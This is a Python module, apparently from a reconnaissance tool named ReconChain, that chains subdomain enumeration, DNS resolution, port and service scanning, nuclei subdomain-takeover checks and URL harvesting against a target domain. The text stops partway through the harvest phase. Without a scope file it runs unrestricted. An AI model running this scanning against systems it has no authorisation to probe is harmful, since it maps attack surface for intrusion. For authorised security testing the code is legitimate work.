"""Phase implementations for ReconChain pipeline."""
from __future__ import annotations

import asyncio
import base64
import contextlib
import fnmatch
import hashlib
import json
import math
import os
import random
import re
import shlex
import shutil
import socket
import struct
import subprocess
import time
import urllib.parse
import urllib.request
import urllib.error
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from reconchain.config import PipelineConfig, VALID_PHASES, _SAFE_HOST, _HOSTNAME_RE
from reconchain.process import (
    _maybe_timeout, _USE_PROXYCHAINS, run_parallel,
    _PIPELINE_CFG, _run, _proxify_cmd,
)
from reconchain.tools import Tools
from reconchain.utils import (
    ensure, log, read_lines, count_nonblank, merge_unique, merge_unique_str,
    _is_valid_hostname, _is_under_domain,
    _existing_artifacts,
    _get_urlopener, _get_no_redirect_urlopener, safe_suffix, _safe_name,
    _target_token, _write_target_tokens,
    _extra_headers_dict, _extra_http_args,
    _async_urlopen, _async_urlopen_no_redirect,
    _dedupe_by_host_path, _dedupe_by_host_params,
    _parse_httpx_tech,
    _mmh3_hash,
    _extract_urls_from_ffuf_json, _merge_dnsx_output,
    _throttle, _throttle_rate,
)



# Phase-level globals
_SCOPE_FILE: Optional[Path] = None
_SCOPE_PATTERNS: List[str] = []
PhaseSet = Set[str]

def _extract_headers(s: str) -> Dict[str, str]:
    heads: Dict[str, str] = {}
    for ln in s.splitlines():
        if ":" in ln:
            k, v = ln.split(":", 1)
            heads[k.strip().lower()] = v.strip()
    return heads

def _request(host: str, path: str, timeout: int = 10) -> bytes:
    opener = _get_urlopener()
    url = host.rstrip("/") + "/" + path.lstrip("/")
    if not url.startswith("http"):
        url = "https://" + url
    try:
        return opener.open(url, timeout=timeout).read()
    except Exception:
        try:
            url2 = url.replace("https://", "http://", 1)
            return opener.open(url2, timeout=timeout).read()
        except Exception:
            return b""

def _norm_line(raw: str) -> str:
    raw = raw.strip()
    while raw.count("//") > 1:
        raw = raw.replace("//", "/")
    return raw.rstrip("/")

async def phase_00_SCOPE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"00-SCOPE"}:
        return {}
    out = outdir / "scope_validated.txt"
    if out.exists() and not force:
        return {"00-SCOPE": str(out), "count": count_nonblank(out)}
    log("info", "Phase 00-SCOPE: scope validation")

    global _SCOPE_FILE, _SCOPE_PATTERNS
    scope_sources = [
        outdir / "scope.txt",
        outdir / "allowlist.txt",
        outdir / ".." / "scope.txt",
        Path.cwd() / "scope.txt",
        Path.cwd() / "allowlist.txt",
    ]
    scope_patterns: List[str] = []
    scope_file: Optional[Path] = None
    for sp in scope_sources:
        if sp.exists():
            scope_file = sp.resolve()
            scope_patterns = [ln.strip().lower() for ln in read_lines(sp) if ln.strip() and not ln.startswith("#")]
            if scope_patterns:
                log("ok", f"00-SCOPE: loaded {len(scope_patterns)} scope patterns from {scope_file}")
                break

    findings: List[str] = []
    if scope_patterns:
        _SCOPE_PATTERNS = scope_patterns
        _SCOPE_FILE = scope_file
        findings.append(f"scope_file={scope_file}")
        findings.append(f"scope_patterns={len(scope_patterns)}")
        for p in scope_patterns[:20]:
            findings.append(f"  pattern={p}")
        # Validate existing discovered assets against scope
        for asset_file in ("all_subs.txt", "resolved.txt", "hosts.txt", "host_targets.txt"):
            af = outdir / asset_file
            if af.exists():
                keep: List[str] = []
                dropped: List[str] = []
                for ln in read_lines(af):
                    h = ln.strip().lower().rstrip(".")
                    h = h.split("://")[-1].split("/")[0]  # strip scheme/path
                    in_scope = any(
                        fnmatch.fnmatch(h, pattern) or h.endswith("." + pattern.lstrip("*."))
                        for pattern in scope_patterns
                    )
                    (keep if in_scope else dropped).append(ln)
                if dropped:
                    findings.append(f"  {asset_file}: {len(dropped)} out-of-scope assets dropped")
                    for d in dropped[:10]:
                        findings.append(f"    dropped={d.strip()}")
                    af.write_text("\n".join(keep) + ("\n" if keep else ""))
                findings.append(f"  {asset_file}: {len(keep)} in-scope assets retained")
        findings.append("[scope] validation complete")
    else:
        findings.append("[scope] No scope file found — running unrestricted")
        _SCOPE_FILE = None
        _SCOPE_PATTERNS = []

    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"00-SCOPE: {len(findings)} scope findings → {out}")
    return {"00-SCOPE": str(out), "count": len(findings)}


async def phase_01_RECON(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    resume: bool = False, force: bool = False
) -> Dict[str, Any]:
    if skip & {"01-RECON"}:
        return {}
    out = outdir / "all_subs.txt"
    if out.exists() and not force:
        return {"01-RECON": str(out), "count": count_nonblank(out)}
    log("info", "Phase 01-RECON: subdomain enumeration")
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("subfinder"):
        _sub_proxy = []
        if _PIPELINE_CFG.proxy:
            _sub_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "subfinder",
                ["subfinder", "-d", domain, "-silent", "-o", str(outdir / "subs_subfinder.txt")] + _sub_proxy,
                900,
            )
        )
    if t.has("amass"):
        # amass v4: passive is the default (the old `-passive` flag is
        # deprecated) and `enum` emits *relationship* records on stdout, e.g.
        #   `sub.example.com (FQDN) --> a_record --> 1.2.3.4 (IPAddress)`
        # (the `-o` file holds the same raw terminal text, NOT a clean list).
        # Feeding those lines straight into the merge made every line fail the
        # hostname validator, so amass silently contributed zero subdomains.
        # Run via a runner that extracts the `<name> (FQDN)` tokens; the 01-RECON
        # merge's _under_domain validator then keeps only in-scope hosts.
        runner = outdir / "logs" / "amass.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            "# DNS enumeration — clear proxy env so Go SOCKS doesn't slow DNS queries\n"
            "unset ALL_PROXY all_proxy HTTPS_PROXY https_proxy HTTP_PROXY http_proxy PROXY\n"
            f"OUT={shlex.quote(str(outdir / 'subs_amass.txt'))}\n"
            f"DOMAIN={shlex.quote(domain)}\n"
            ': > "$OUT"\n'
            'amass enum -d "$DOMAIN" -nocolor 2>/dev/null '
            "| grep --line-buffered -oE '[A-Za-z0-9._-]+ \\(FQDN\\)' "
            "| sed 's/ (FQDN)$//' >> \"$OUT\" || true\n"
        )
        runner.chmod(0o755)
        jobs.append(("amass", ["bash", str(runner)], _maybe_timeout(600)))

    if not jobs:
        log("warn", "01-RECON: no subdomain tools available")
        ensure(out)
        return {"01-RECON": str(out), "count": 0}

    # Incremental merge: while tools run, merge partial results into all_subs.txt
    # every 30s so downstream phases (02-RESOLVE, 04-SCAN, 05-HARVEST) can start early.
    def _under_domain(s: str) -> bool:
        return _is_valid_hostname(s) and _is_under_domain(s, domain)

    _a1_sources = [
        outdir / "subs_subfinder.txt",
        outdir / "subs_amass.txt",
    ]

    async def _incremental_merge() -> None:
        """Merge tool outputs into all_subs.txt every 30s during execution."""
        _last_size = 0
        while True:
            await asyncio.sleep(30)
            existing = [p for p in _a1_sources if p.exists()]
            if existing:
                current = sum(len(read_lines(p)) for p in existing)
                if current > _last_size:
                    merge_unique(_a1_sources, out, validator=_under_domain)
                    _last_size = current

    merge_task = asyncio.create_task(_incremental_merge())
    try:
        results = await run_parallel(jobs, outdir)
    finally:
        merge_task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await merge_task

    # Surface partial tool failures in summary.json (BUG-5). rc==0 and
    # skipped are not failures; anything else (timeouts, crash, signal)
    # is recorded so the user knows the merged output may be partial.
    failures = {r.name: r.rc for r in results if r.rc not in (0, None) and r.note != "skipped"}

    # Final merge
    n = merge_unique(_a1_sources, out, validator=_under_domain)
    if n == 0:
        ensure(out)  # Empty file signals 01-RECON completed (no subs found)
    log("ok", f"01-RECON: {n} unique subdomains → {out}")
    ret: Dict[str, Any] = {"01-RECON": str(out), "count": n}
    if failures:
        ret["failures"] = failures
        log("warn", f"01-RECON: partial — failed tools: {failures}")
    return ret


async def phase_02_RESOLVE(
    domain: str,
    outdir: Path,
    t: Tools,
    only: PhaseSet,
    skip: PhaseSet,
    prev: Dict[str, Any],
    resume: bool = False,
    force: bool = False,
) -> Dict[str, Any]:
    if skip & {"02-RESOLVE"}:
        return {}
    out = outdir / "resolved.txt"
    full = outdir / "resolved_full.txt"
    if out.exists() and not force:
        return {"02-RESOLVE": str(out), "count": count_nonblank(out)}
    subs_file = Path(prev.get("01-RECON") or outdir / "all_subs.txt")

    # Fast check: if 01-RECON already finished (file exists), don't poll
    if not read_lines(subs_file):
        is_done = isinstance(prev.get("01-RECON"), str) or subs_file.exists()
        if is_done:
            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
            return {"02-RESOLVE": str(out), "count": 0}
        for _ in range(120):  # up to ~10 min
            await asyncio.sleep(5)
            if read_lines(subs_file):
                break
        if not read_lines(subs_file):
            log("warn", "02-RESOLVE: 01-RECON produced no subdomains; skipping")
            return {"02-RESOLVE": str(out), "count": 0}

    log("info", "Phase 02-RESOLVE: resolution with parallel fallback (massdns → dnsx → dig)")
    _a2_processed: Set[str] = set()
    _a2_stable_count = 0
    # Run puredns on initial subdomains for wildcard-resistant resolution
    if t.has("puredns"):
        puredns_out = outdir / "resolved_puredns.txt"
        _puredns_resolvers = Path.home() / ".config" / "puredns" / "resolvers.txt"
        if _puredns_resolvers.exists():
            await _run(
                "puredns",
                ["puredns", "resolve", str(subs_file), "-w", str(puredns_out), "--skip-wildcard-filter"],
                1800, outdir,
            )
        else:
            log("warn", "puredns: no resolvers at ~/.config/puredns/resolvers.txt; skipping wildcard-resistant resolution")
        if puredns_out.exists() and read_lines(puredns_out):
            existing = set()
            if out.exists():
                existing.update(l.strip().lower() for l in read_lines(out) if l.strip())
            new_puredns: List[str] = []
            for ln in read_lines(puredns_out):
                host = ln.strip().lower()
                if host and host not in existing:
                    existing.add(host)
                    new_puredns.append(host)
            if new_puredns:
                with out.open("a") as f:
                    f.write("\n".join(new_puredns) + "\n")

    async def _resolve_socket(host: str) -> Optional[str]:
        """Fallback resolver using Python socket.getaddrinfo.
        Skips when SOCKS proxy is active without PySocks to avoid DNS leaks."""
        from reconchain.process import _USE_PROXYCHAINS, _PIPELINE_CFG
        from reconchain.utils import _socks_patched
        proxy = _PIPELINE_CFG.proxy or os.environ.get("PROXY", "")
        if proxy and not proxy.startswith(("http://", "https://")) and not _socks_patched:
            return None
        if _USE_PROXYCHAINS and not _socks_patched:
            return None
        try:
            await asyncio.get_event_loop().getaddrinfo(host, 0, family=socket.AF_UNSPEC)
            return host
        except Exception:
            return None

    async def _resolve_batch(batch_subs: Path) -> int:
        """Resolve subdomains with fallback chain: massdns → dnsx → socket."""
        tmp = outdir / ".a2_batch.txt"
        batch = [s.strip().lower() for s in read_lines(batch_subs)
                 if s.strip() and s.strip().lower() not in _a2_processed]
        if not batch:
            return 0
        _a2_processed.update(b.lower() for b in batch)
        tmp.write_text("\n".join(batch) + "\n")
        resolved_count = 0
        # Try massdns first (fastest)
        if t.has("massdns"):
            massdns_out = outdir / ".a2_massdns_batch.txt"
            massdns_resolvers = Path.home() / ".config" / "massdns" / "resolvers.txt"
            if massdns_resolvers.exists():
                await _run(
                    "massdns",
                    ["massdns", "-r", str(massdns_resolvers), "-t", "A", "-o", "S",
                     "-w", str(massdns_out), str(tmp)],
                    600, outdir,
                )
                if massdns_out.exists() and read_lines(massdns_out):
                    for ln in read_lines(massdns_out):
                        if ln.strip() and " " in ln:
                            host = ln.split()[0].rstrip(".").lower()
                            if host and host not in _a2_processed:
                                merge_unique_str(host, out)
                                merge_unique_str(host, full)
                                resolved_count += 1
                    massdns_out.unlink(missing_ok=True)
                    tmp.unlink(missing_ok=True)
                    return resolved_count
                massdns_out.unlink(missing_ok=True)
            else:
                log("warn", "massdns: no resolvers at ~/.config/massdns/resolvers.txt; trying dnsx")
        # Fall back to dnsx batch resolution
        if t.has("dnsx"):
            full_batch = outdir / ".a2_full_batch.txt"
            res = await _run(
                "dnsx",
                ["dnsx", "-silent", "-l", str(tmp), "-o", str(full_batch),
                 "-a", "-aaaa", "-cname", "-resp"],
                1800, outdir,
            )
            if full_batch.exists() and read_lines(full_batch):
                cnt = _merge_dnsx_output(full_batch, out, full)
                full_batch.unlink(missing_ok=True)
                tmp.unlink(missing_ok=True)
                return cnt
            full_batch.unlink(missing_ok=True)
        # Final fallback: Python socket resolution
        log("info", f"02-RESOLVE: resolving {len(batch)} host(s) via socket fallback")
        tasks = [_resolve_socket(h) for h in batch]
        results = await asyncio.gather(*tasks)
        resolved_hosts = [h for h in results if h is not None]
        if resolved_hosts:
            for host in resolved_hosts:
                merge_unique_str(host, out)
            resolved_count += len(resolved_hosts)
        tmp.unlink(missing_ok=True)
        return resolved_count

    # Process initial available subdomains
    await _resolve_batch(subs_file)

    # Poll for new subdomains while 01-RECON may still be running (up to 10 min total)
    for _ in range(40):
        await asyncio.sleep(15)
        new_subs = [s.strip().lower() for s in read_lines(subs_file)
                    if s.strip() and s.strip().lower() not in _a2_processed]
        if not new_subs:
            _a2_stable_count += 1
            if _a2_stable_count >= 4:
                break
            continue
        _a2_stable_count = 0
        await _resolve_batch(subs_file)

    c = count_nonblank(out)
    return {"02-RESOLVE": str(out), "count": c}


async def phase_03_PERMUTE(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"03-PERMUTE"}:
        return {}
    _a3_stamp = outdir / f".phase_03.stamp.{os.getpid()}"
    if not force and any(outdir.glob(".phase_03.stamp.*")):
        _a3_out = outdir / "all_subs.txt"
        return {"01-RECON": str(_a3_out), "03-PERMUTE": str(_a3_out), "count": count_nonblank(_a3_out)}
    log("info", "Phase 03-PERMUTE: subdomain permutation (alterx → dnsgen → dnsx)")
    # Input: all discovered subdomains from 01-RECON (stable after Stage 0)
    subs_in = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    if not subs_in.exists() or not read_lines(subs_in):
        log("warn", "03-PERMUTE: no subdomains to permute; skipping")
        return {}
    permuted = outdir / "subs_permuted.txt"
    resolved = outdir / "subs_permuted_resolved.txt"
    merged = outdir / "subs_merged.txt"
    all_subs = outdir / "all_subs.txt"
    alt_out = outdir / "subs_permuted_alterx.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    if t.has("alterx"):
        runner = outdir / "logs" / "alterx_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(subs_in))}\n"
            f"OUT={shlex.quote(str(alt_out))}\n"
            "alterx -l \"$IN\" -silent -o \"$OUT\" 2>/dev/null || true\n"
        )
        runner.chmod(0o755)
        jobs.append(("alterx", ["bash", str(runner)], 600))
    if t.has("dnsgen"):
        runner = outdir / "logs" / "dnsgen_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"IN={shlex.quote(str(subs_in))}\n"
            f"OUT={shlex.quote(str(permuted))}\n"
            "dnsgen \"$IN\" 2>/dev/null | sort -u > \"$OUT\" || true\n"
        )
        runner.chmod(0o755)
        jobs.append(("dnsgen", ["bash", str(runner)], 600))
    if jobs:
        await run_parallel(jobs, outdir)
    # Merge alterx results into subs_in so dnsx can also resolve them
    if alt_out.exists() and read_lines(alt_out):
        merge_unique([subs_in, alt_out], subs_in)
    # Resolve permuted subdomains with dnsx (batched to avoid timeout on large sets)
    if permuted.exists() and read_lines(permuted) and t.has("dnsx"):
        all_permuted = read_lines(permuted)
        batch_size = 200
        resolved_all = outdir / "subs_permuted_resolved.txt"
        ensure(resolved_all).write_text("")
        batch_jobs = []
        for i in range(0, len(all_permuted), batch_size):
            batch = all_permuted[i:i + batch_size]
            batch_file = outdir / f".permuted_batch_{i}.txt"
            batch_file.write_text("\n".join(batch) + "\n")
            batch_out = outdir / f".permuted_batch_{i}_resolved.txt"
            batch_jobs.append((
                f"dnsx-permuted-{i}",
                ["dnsx", "-silent", "-l", str(batch_file),
                 "-o", str(batch_out), "-resp", "-a", "-aaaa"],
                _maybe_timeout(300),
            ))
        if batch_jobs:
            await run_parallel(batch_jobs, outdir)
            for i in range(0, len(all_permuted), batch_size):
                batch_out = outdir / f".permuted_batch_{i}_resolved.txt"
                if batch_out.exists() and read_lines(batch_out):
                    with resolved_all.open("a") as f:
                        f.write("\n".join(read_lines(batch_out)) + "\n")
                batch_out.unlink(missing_ok=True)
                (outdir / f".permuted_batch_{i}.txt").unlink(missing_ok=True)
        resolved = resolved_all
    # Merge permuted results into the existing subdomain list
    merge_srcs = [subs_in]
    if resolved.exists() and read_lines(resolved):
        # dnsx -resp output: sub.example.com [A] [1.2.3.4] → extract host
        resolved_hosts = outdir / "subs_permuted_hosts.txt"
        clean: List[str] = []
        for ln in read_lines(resolved):
            parts = ln.split()
            if parts:
                host = parts[0].strip()
                if _is_valid_hostname(host) and _is_under_domain(host, domain):
                    clean.append(host)
        if clean:
            ensure(resolved_hosts).write_text("\n".join(set(clean)) + "\n")
            merge_srcs.append(resolved_hosts)
    n = merge_unique(merge_srcs, all_subs, lambda h: _is_under_domain(h, domain))
    _a3_stamp.write_text("")
    permuted.unlink(missing_ok=True)
    resolved.unlink(missing_ok=True)
    log("ok", f"03-PERMUTE: {n} total subdomains (after permutation)")
    return {"01-RECON": str(all_subs), "03-PERMUTE": str(all_subs), "count": n}


async def phase_04_SCAN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"04-SCAN"}:
        return {}
    if all(
        (outdir / f).exists()
        for f in ("ports.txt", "hosts.txt", "host_targets.txt", "takeover.txt")
    ) and not force:
        ports_file = outdir / "ports.txt"
        return {
            "04-SCAN.ports": str(ports_file),
            "04-SCAN.hosts": str(outdir / "hosts.txt"),
            "04-SCAN.targets": str(outdir / "host_targets.txt"),
            "04-SCAN.takeover": str(outdir / "takeover.txt"),
            "count": count_nonblank(ports_file),
        }
    log("info", "Phase 04-SCAN: ports / hosts / takeover (parallel)")
    # naabu/httpx/nuclei-takeover accept host:port (or hosts from httpx)
    hosts = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
    # nuclei takeover templates need CLEAN subdomains (no `[1.2.3.4]` suffix from dnsx -resp)
    subs = Path(prev.get("01-RECON") or outdir / "all_subs.txt")
    ports_file = outdir / "ports.txt"
    jobs: List[Tuple[str, List[str], int]] = []
    have_hosts = hosts.exists() and bool(read_lines(hosts))
    have_subs = subs.exists() and bool(read_lines(subs))
    if not have_hosts and not have_subs:
        for _ in range(240):
            await asyncio.sleep(5)
            have_hosts = hosts.exists() and bool(read_lines(hosts))
            have_subs = subs.exists() and bool(read_lines(subs))
            if have_hosts or have_subs:
                break
        if not have_hosts and not have_subs:
            log("warn", "04-SCAN: no host or subdomain input; skipping")
            return _existing_artifacts({
                "04-SCAN.ports": str(ports_file),
                "04-SCAN.hosts": str(outdir / "hosts.txt"),
                "04-SCAN.targets": str(outdir / "host_targets.txt"),
                "04-SCAN.takeover": str(outdir / "takeover.txt"),
            })
    if have_hosts and t.has("naabu"):
        jobs.append(
            (
                "naabu",
                [
                    "naabu", "-silent", "-l", str(hosts), "-o", str(ports_file),
                    "-top-ports", "1000",
                ],
                _maybe_timeout(1800),
            )
        )
        # UDP scanning not supported by naabu 2.x; skipped
    elif have_hosts and t.has("nmap"):
        _nmap_cmd = ["nmap", "-iL", str(hosts), "-Pn", "-p-", "--open",
                     "--script=http-enum", "-oG", str(outdir / "ports.gnmap")]
        jobs.append(("nmap", _nmap_cmd, _maybe_timeout(1800)))
    # DNS takeover check via nuclei (separate from http/takeovers)
    if t.has("nuclei"):
        await _update_nuclei_templates(outdir)
    if t.has("nuclei") and have_subs:
        # dns/ directory contains individual takeover templates (no dns/takeovers/ subdir)
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "nuclei-dns-takeover",
                [
                    "nuclei", "-silent", "-l", str(subs),
                    "-t", "dns/", "-tags", "takeover",
                    "-o", str(outdir / "takeover_dns.txt"),
                ] + _nuc_proxy,
                _maybe_timeout(1800),
            )
        )
    if have_hosts and t.has("httpx"):
        _httpx_proxy = []
        if _PIPELINE_CFG.proxy:
            _httpx_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "httpx",
                 [
                    "httpx",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-o",
                    str(outdir / "hosts.txt"),
                    "-title",
                    "-tech-detect",
                    "-status-code",
                    "-follow-redirects",
                    "-fr",
                ] + _extra_http_args() + _httpx_proxy,
                1800,
            )
        )
    if have_hosts and t.has("httprobe"):
        httprobe_out = outdir / "hosts_httprobe.txt"
        httprobe_runner = outdir / "logs" / "httprobe_runner.sh"
        ensure(httprobe_runner)
        httprobe_runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -eu\n"
            f"INPUT={shlex.quote(str(hosts))}\n"
            f"OUTPUT={shlex.quote(str(httprobe_out))}\n"
            'cat "$INPUT" | httprobe -c 50 -t 3000 > "$OUTPUT"\n'
        )
        httprobe_runner.chmod(0o755)
        jobs.append(
            (
                "httprobe",
                ["bash", str(httprobe_runner)],
                600,
            )
        )
    if have_hosts and t.has("nuclei"):
        _nuc_proxy = []
        if _PIPELINE_CFG.proxy:
            _nuc_proxy = ["-proxy", _PIPELINE_CFG.proxy]
        jobs.append(
            (
                "nuclei-takeover",
                [
                    "nuclei",
                    "-silent",
                    "-l",
                    str(hosts),
                    "-t",
                    "http/takeovers",
                    "-o",
                    str(outdir / "takeover.txt"),
                ] + _extra_http_args() + _nuc_proxy,
                _maybe_timeout(1800),
            )
        )
    await run_parallel(jobs, outdir)
    # Merge httprobe results into hosts.txt
    httprobe_out = outdir / "hosts_httprobe.txt"
    hosts_file_path = outdir / "hosts.txt"
    if httprobe_out.exists() and read_lines(httprobe_out) and hosts_file_path.exists():
        merge_unique([httprobe_out], hosts_file_path)
    # ── Service version detection ─────────────────────────────────────
    # If naabu found ports and nmap is available, run nmap -sV on the
    # discovered host:port pairs to detect service versions (Apache,
    # nginx, OpenSSH, etc.) and write a services.txt artifact.
    services_file = outdir / "services.txt"
    if ports_file.exists() and read_lines(ports_file) and t.has("nmap"):
        sv_jobs: List[Tuple[str, List[str], int]] = []
        # Group by host to batch nmap calls (faster than 1 port per call)
        host_ports: Dict[str, List[str]] = {}
        for ln in read_lines(ports_file):
            if ":" in ln:
                h, p = ln.rsplit(":", 1)
                host_ports.setdefault(h, []).append(p)
        for h, pp in host_ports.items():
            ports_csv = ",".join(pp)
            out_sv = outdir / f"services_{safe_suffix(h)}.gnmap"
            _sv_cmd = ["nmap", "-Pn", "-sV", "--open",
                       "-p", ports_csv, str(h), "-oG", str(out_sv)]
            sv_jobs.append((f"nmap-sv-{_safe_name(h)}", _sv_cmd, 600))
        if sv_jobs:
            await run_parallel(sv_jobs, outdir)
            # Merge all service gnmap files into services.txt
            sv_findings: List[str] = []
            for svp in sorted(outdir.glob("services_*.gnmap")):
                for ln in svp.read_text(encoding="utf-8", errors="ignore").splitlines():
                    if ln.startswith("Host:"):
                        # gnmap: Host: 1.2.3.4 () Ports: 80/open/tcp//http//Apache httpd 2.4.41///
                        sv_findings.append(ln.strip())
            if sv_findings:
                ensure(services_file).write_text("\n".join(sv_findings) + "\n")
                log("ok", f"04-SCAN: {len(sv_findings)} service detections → {services_file}")
            for svp in outdir.glob("services_*.gnmap"):
                svp.unlink(missing_ok=True)
    # If nmap was used instead of naabu, synthesize ports.txt from the
    # greppable output so downstream phases see a consistent artifact.
    if not ports_file.exists():
        gnmap = outdir / "ports.gnmap"
        if gnmap.exists():
            ports: Set[str] = set()
            for ln in gnmap.read_text(encoding="utf-8", errors="ignore").splitlines():
                if not ln.startswith("Host:"):
                    continue
                # gnmap line: Host: 1.2.3.4 () Ports: 80/open/tcp//http/// ...
                head, _, ports_part = ln.partition("Ports:")
                ip = head.split()[1] if len(head.split()) > 1 else ""
                for entry in ports_part.split(","):
                    bits = entry.strip().split("/")
                    if len(bits) >= 3 and bits[1] == "open":
                        ports.add(f"{ip}:{bits[0]}")
                ensure(ports_file).write_text("\n".join(sorted(ports)) + ("\n" if ports else ""))
    raw_hosts = outdir / "hosts.txt"
    targets = outdir / "host_targets.txt"
    if raw_hosts.exists() and read_lines(raw_hosts):
        _write_target_tokens(raw_hosts, targets)
        _parse_httpx_tech(raw_hosts, outdir / "tech.txt")
    elif have_hosts:
        _write_target_tokens(hosts, targets)
    return _existing_artifacts({
        "04-SCAN.ports": str(ports_file),
        "04-SCAN.hosts": str(raw_hosts),
        "04-SCAN.targets": str(targets),
        "04-SCAN.takeover": str(outdir / "takeover.txt"),
    })


async def phase_04b_TAKEOVER_VALIDATE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"04b-TAKEOVER-VALIDATE"}:
        return {}
    _out = outdir / "takeover_confirmed.txt"
    if _out.exists() and not force:
        return {"04b-TAKEOVER-VALIDATE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 04b-TAKEOVER-VALIDATE: confirm dangling CNAME takeover candidates")
    findings: List[str] = []
    _tv_urlopen = _get_urlopener()
    _tv_extra_headers = _extra_headers_dict()
    takeover_sources = [
        outdir / "takeover.txt",
        outdir / "takeover_dns.txt",
    ]
    candidates: List[str] = []
    for src in takeover_sources:
        if src.exists():
            for ln in read_lines(src):
                ln = ln.strip()
                if not ln:
                    continue
                # Strip extra metadata nuclei may append:  URL [type] [cname]
                url = ln.split()[0] if ln.split() else ln
                if url and (url.startswith("http://") or url.startswith("https://") or "." in url):
                    candidates.append(url)
    candidates = _dedupe_by_host_path(candidates)
    if not candidates:
        log("warn", "04b-TAKEOVER-VALIDATE: no takeover candidates found; skipping")
        return {"04b-TAKEOVER-VALIDATE": str(_out), "count": 0}
    findings.append(f"candidates_found={len(candidates)}")
    for cand in candidates[:_PIPELINE_CFG.sample_urls_fuzz]:
        await _throttle_rate()
        try:
            cand = cand.strip()
            if cand.startswith("http://") or cand.startswith("https://"):
                url = cand
            else:
                url = f"http://{cand}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", **_tv_extra_headers})
            status, headers, body_bytes = await _async_urlopen(_tv_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore").lower()
            # Common takeover signatures: 404, NXDOMAIN, "no such bucket", "404 not found", etc.
            takeover_indicators = [
                "no such bucket", "does not exist", "not found", "repository not found",
                "there is no site", "no such app", "404 blog not found", "please configure",
                "this page is not available", "the page you are looking for is not here",
                "this site is not configured", "account not found", "this user's page",
                "is not currently accepting", "there is nothing here for you",
            ]
            if status == 404 or any(ind in body for ind in takeover_indicators):
                findings.append(f"[confirmed] {cand} → HTTP {status} (likely vulnerable)")
                if "server" in headers:
                    findings.append(f"  server={headers['server']}")
            elif status in (200, 301, 302):
                findings.append(f"[potential] {cand} → HTTP {status} (check manually)")
            else:
                findings.append(f"[checked] {cand} → HTTP {status} (not vulnerable)")
        except Exception as e:
            findings.append(f"[error] {cand} → {e}")
    if not any(f.startswith("[confirmed]") for f in findings):
        findings.append("[result] No confirmed takeover vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"04b-TAKEOVER-VALIDATE: {len(findings)} findings → {out}")
    return {"04b-TAKEOVER-VALIDATE": str(_out), "count": len(findings)}


async def phase_05_HARVEST(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"05-HARVEST"}:
        return {}
    _c1_out = outdir / "urls_all.txt"
    if _c1_out.exists() and not force:
        return {"05-HARVEST": str(_c1_out), "count": count_nonblank(_c1_out)}
    log("info", "Phase 05-HARVEST: URL harvesting (parallel groups)")

    async def _c1_resolve_hosts() -> Optional[Path]:
        h = Path(prev.get("04-SCAN.targets") or outdir / "host_targets.txt")
        h_ok = h.exists() and bool(read_lines(h))
        if not h_ok:
            h = Path(prev.get("04-SCAN.hosts") or outdir / "hosts.txt")
            h_ok = h.exists() and bool(read_lines(h))
        if h_ok and h.name == "hosts.txt":
            normalized = outdir / "host_targets.txt"
            # Only normalize if destination doesn't exist yet (04-SCAN already
            # produced host_targets.txt from the same hosts.txt in its phase).
            if not normalized.exists():
                _write_target_tokens(h, normalized)
            h = normalized
        if not h.exists() or not bool(read_lines(h)):
            h = Path(prev.get("02-RESOLVE") or outdir / "resolved.txt")
        if h.exists() and bool(read_lines(h)):
            return h
        return None

    hosts = await _c1_resolve_hosts()
    if hosts is None:
        log("warn", "05-HARVEST: no host input; skipping")
        return {}
    waf_detected = getattr(_PIPELINE_CFG, 'waf_detected', False)
    if waf_detected:
        log("info", "05-HARVEST: WAF detected, reducing crawler depth/concurrency")
    g1: List[Tuple[str, List[str], int]] = []
    # gau doesn't support -l for file input; use per-host loop.
    if t.has("gau"):
        runner = outdir / "logs" / "gau_runner.sh"
        ensure(runner)
        runner.write_text(
            "#!/usr/bin/env bash\n"
            "set -u\n"
            f"OUT={shlex.quote(str(outdir / 'urls_gau.txt'))}\n"
            f"IN={shlex.quote(str(hosts))}\n"
            ': > "$OUT"\n'
            'xargs -r -P 5 -I{} timeout 300 gau '
            '--subs --threads 2 '
            '--blacklist ttf,woff,svg,png,jpg,gif,ico,css {} >> "$OUT" 2>/dev/null < "$IN" || true\n'
        )
        runner.chmod(0o755)
        g1.append(("gau", ["bash", str(runner)], _maybe_timeout(3600)))

    if t.has("gospider"):
        # gospider's -o is an output *folder* (one file per site), not a file,
        # so we don't use it: run via a runner that captures stdout and extracts
